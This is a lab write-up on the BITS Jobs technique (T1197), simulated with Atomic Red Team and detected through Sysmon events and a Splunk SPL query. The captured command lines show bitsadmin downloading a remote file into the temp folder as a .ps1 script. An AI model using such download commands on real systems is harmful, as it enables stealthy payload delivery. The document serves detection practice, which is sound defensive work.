# T1197 — BITS Jobs

## What This Attack Does

Windows Background Intelligent Transfer Service (BITS) is a
legitimate mechanism normally used for OS and application updates
to download files in the background. Attackers abuse it to
download or upload malicious files while blending in with normal
system traffic, since BITS transfers are trusted and often
overlooked by defenders and network monitoring tools.

## How I Simulated It

Tool: Atomic Red Team
Command executed on Windows Server target:

Invoke-AtomicTest T1197 -TestNumbers 1

This test uses `bitsadmin.exe` to attempt downloading a file from a
remote GitHub URL via a BITS transfer job.

Note: The transfer timed out and was canceled after 120 seconds,
since this lab environment has no internet access on the Windows
host. The attack attempt itself was still fully generated and
logged before failing at the network level — the same outcome a
real attacker would see attempting a BITS transfer through an
outbound firewall block or proxy restriction.

## What Splunk Captured

Sysmon Event ID 1 (Process Creation) fired 3 times, capturing the
full process chain:

**Event 1:**
- Image: `C:\Windows\System32\cmd.exe`
- User: `WINDOWS\khaled`
- CommandLine: `"cmd.exe" /c bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %%temp%%\bitsadmin1_flag.ps1`
- ParentImage: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`

**Event 2:**
- Image: `C:\Windows\System32\bitsadmin.exe`
- User: `WINDOWS\khaled`
- CommandLine: `bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Users\khaled\AppData\Local\Temp\bitsadmin1_flag.ps1`
- ParentImage: `C:\Windows\System32\cmd.exe`

**Event 3:** A second `bitsadmin.exe` process entry, same chain.

## SPL Detection Query

```spl
index=* sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" "bitsadmin"
| rex field=_raw "Name='Image'>(?P<Image>[^<]+)"
| rex field=_raw "Name='CommandLine'>(?P<CommandLine>[^<]+)"
| rex field=_raw "Name='ParentImage'>(?P<ParentImage>[^<]+)"
| rex field=_raw "Name='User'>(?P<User>[^<]+)"
| rex field=_raw "Name='UtcTime'>(?P<UtcTime>[^<]+)"
| table UtcTime, User, Image, CommandLine, ParentImage
```

## Result

Splunk successfully detected the BITS transfer attempt across the
full process chain (`powershell.exe` → `cmd.exe` → `bitsadmin.exe`),
capturing the exact download URL and destination file path. The
transfer itself failed due to no internet access in this lab, but
the attempt was fully visible in process creation logs —
demonstrating that even failed BITS jobs leave a clear forensic
trail.

## Screenshot

<img width="865" height="293" alt="T1197-windows png" src="https://github.com/user-attachments/assets/e86e1378-929f-4449-9629-5ae7404314da" />
<img width="1906" height="1026" alt="T1197-splunk png" src="https://github.com/user-attachments/assets/0280af32-7d69-407a-a8ef-6a6f3f64ca63" />
